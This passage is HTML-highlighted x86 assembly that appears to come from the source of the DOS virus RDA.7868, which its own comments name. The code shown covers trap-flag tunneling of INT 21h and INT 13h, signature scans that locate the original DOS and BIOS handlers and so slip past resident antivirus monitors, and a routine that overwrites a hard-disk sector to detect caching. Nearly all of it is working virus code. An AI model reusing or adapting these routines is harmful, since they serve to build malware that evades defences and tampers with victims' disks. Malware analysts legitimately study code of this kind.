         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tun_int_stat</span><span class="sc4">],</span><span class="sc2">00000001b</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">scan_int21</span><span class="sc0">      </span><span class="sc1">; Tunneling interrupt 21h? Jump to...</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_addr</span><span class="sc4">],</span><span class="sc2">70h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int01_exit_</span><span class="sc0">     </span><span class="sc1">; Not DOS segment? Jump to int01_e...</span><span class="sc0">
</span><span class="sc5">found_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tunnel_stat</span><span class="sc4">],</span><span class="sc2">00000001b</span><span class="sc0">
</span><span class="sc5">int01_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_int01</span><span class="sc0">


         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int01_exit__</span><span class="sc0">
</span><span class="sc5">scan_int21</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tunnel_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tunnel_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">scan_string</span><span class="sc0">  </span><span class="sc1">; SI = offset of scan_string</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">scan_end</span><span class="sc4">-</span><span class="sc5">scan_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Save DI at stack</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">       </span><span class="sc1">; Found scan-string at instructio...?</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Load DI from stack</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">scan_int21_</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to scan_int21_</span><span class="sc0">
</span><span class="sc5">found_seg_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_seg</span><span class="sc0">
</span><span class="sc5">scan_int21_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">scan_string_</span><span class="sc0">     </span><span class="sc1">; SI = offset of scan_string_</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">scan_end_</span><span class="sc4">-</span><span class="sc5">scan_begin_</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">       </span><span class="sc1">; Found scan-string at instructio...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_seg_</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to found_seg_</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">int01_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">sp_</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">0000000100000000b</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">
</span><span class="sc5">int01_exit__</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

</span><span class="sc5">int01_virus_</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 01h of RDA.7868</span><span class="sc0">
</span><span class="sc5">int03_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 03h of RDA.7868</span><span class="sc0">
</span><span class="sc5">int2a_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 2ah of RDA.7868</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">store_int01</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set address of interrupt 01h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">sp_</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">1111111011111111b</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int01_addr_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int01_addr_</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 01h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">  </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">tunnel_int21</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Tunnel interrupt 21h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tunnel_stat</span><span class="sc4">],</span><span class="sc2">00000000b</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int01_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int01_virus</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_int01</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tun_int_stat</span><span class="sc4">],</span><span class="sc2">00000000b</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack (flags)</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000100000000b</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack (AX)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">tun_i21_exit</span><span class="sc0">     </span><span class="sc1">; AX = offset of tun_i21_exit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tun_exit_off</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store offset of tun_i21_exit</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">      </span><span class="sc1">; Get DOS version</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">tun_i21_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tunnel_stat</span><span class="sc4">],</span><span class="sc2">00000001b</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tun_i21_exi</span><span class="sc0">     </span><span class="sc1">; Not finnished tunneling? Jump to...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tunnel_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tunnel_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">tun_i21_exi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">tunnel_int13</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Tunnel interrupt 13h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tunnel_stat</span><span class="sc4">],</span><span class="sc2">00000000b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tun_i13_stat</span><span class="sc4">],</span><span class="sc2">00000001b</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 13h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int01_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int01_virus</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_int01</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tun_int_stat</span><span class="sc4">],</span><span class="sc2">00000001b</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack (flags)</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000100000000b</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack (AX)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">tun_i13_exit</span><span class="sc0">     </span><span class="sc1">; AX = offset of tun_i13_exit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tun_exit_off</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store offset of tun_i13_exit</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">         </span><span class="sc1">; Verify disk sector(s) (no sectors)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; Head zero, drive one-hundred and...</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">tun_i13_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tunnel_stat</span><span class="sc4">],</span><span class="sc2">00000001b</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tun_i13_exi</span><span class="sc0">     </span><span class="sc1">; Not finnished tunneling? Jump to...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tunnel_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tunnel_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">tun_i13_exi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">exam_cache</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Examine if disk is cached</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tun_i13_stat</span><span class="sc4">],</span><span class="sc2">00000001b</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">         </span><span class="sc1">; Read sector(s) into memory (one...)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; DX = head- and drive number (ha...)</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">data_buffer</span><span class="sc0">  </span><span class="sc1">; BX = offset of data_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; CX = cylinder- and sector number</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">cache_exit</span><span class="sc0">      </span><span class="sc1">; Error? Jump to cache_exit</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Save two bytes of disk sector at...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'FS'</span><span class="sc0">       </span><span class="sc1">; Store 'FS' in the second disk se...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">         </span><span class="sc1">; Write disk sector(s) (one disk ...)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int13_call</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">         </span><span class="sc1">; Read sector(s) into memory (one...)</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'FS'</span><span class="sc0">  </span><span class="sc1">; Disk cached?</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Load two bytes of disk sector fr...</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">disk_cached</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to disk_cached</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tun_i13_stat</span><span class="sc4">],</span><span class="sc2">00000000b</span><span class="sc0">
</span><span class="sc5">disk_cached</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">         </span><span class="sc1">; Write disk sector(s) (one disk sector)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int13_call</span><span class="sc0">
</span><span class="sc5">cache_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">cache_stat</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">    </span><span class="sc1">; Don't examine if disk is cached</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">scan_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">scan_string</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">10010000b</span><span class="sc0">     </span><span class="sc1">; NOP (opcode 90h)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">10010000b</span><span class="sc0">     </span><span class="sc1">; NOP (opcode 90h)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">11101000b</span><span class="sc0">     </span><span class="sc1">; CALL (opcode 0e8h,?,?)</span><span class="sc0">
</span><span class="sc5">scan_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">scan_begin_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">scan_string_</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">11111010b</span><span class="sc4">,</span><span class="sc2">10000000b</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">11111100b</span><span class="sc0">     </span><span class="sc1">; CLI, CMP AL,imm8 (opcode 0fah,8...)</span><span class="sc0">
</span><span class="sc5">scan_end_</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">get_int_addr</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get interrupt address</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; BX = offset of interrupt address</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; "  "   "    "      "        "</span><span class="sc0">
         </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ES:BX = interrupt address</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

